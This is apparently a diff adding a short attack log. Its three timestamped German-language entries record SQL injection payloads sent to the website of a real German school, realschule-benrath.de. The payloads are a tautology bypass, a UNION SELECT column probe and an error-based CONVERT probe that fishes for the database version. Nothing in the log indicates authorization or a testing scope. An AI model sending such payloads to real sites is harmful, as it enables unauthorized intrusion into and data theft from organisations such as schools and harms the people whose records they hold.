@@ -1,0 +1,3 @@
+[2025-05-01 08:04:18.088627] SQLi auf https://realschule-benrath.de/ mit ' OR '1'='1
+[2025-05-01 08:04:18.784390] SQLi auf https://realschule-benrath.de/ mit ' UNION SELECT 1,2,3--
+[2025-05-01 08:04:19.657265] SQLi auf https://realschule-benrath.de/ mit ' AND 1=CONVERT(int,@@version)--
